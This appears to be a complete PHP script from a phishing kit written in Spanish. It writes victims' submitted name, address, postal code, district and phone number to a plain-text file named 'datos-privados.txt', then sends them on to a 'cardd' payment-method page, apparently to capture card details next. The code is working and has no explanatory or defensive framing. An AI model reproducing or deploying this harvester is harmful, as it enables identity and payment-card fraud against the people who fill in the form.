<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = "Nombre: " . $_POST['nombre'] . "\n";
    $data .= "Dirección: " . $_POST['direccion'] . "\n";
    $data .= "Código Postal: " . $_POST['codigo_postal'] . "\n";
    $data .= "Delegación: " . $_POST['delegacion'] . "\n";
    $data .= "Número Telefónico: " . $_POST['numero'] . "\n";
    $data .= "Fecha y Hora: " . date('Y-m-d H:i:s') . "\n\n";

    file_put_contents('datos-privados.txt', $data, FILE_APPEND);

    // Redirigir al usuario a cardd/index.php
    header('Location: cardd/metododepago.php');
    exit;
}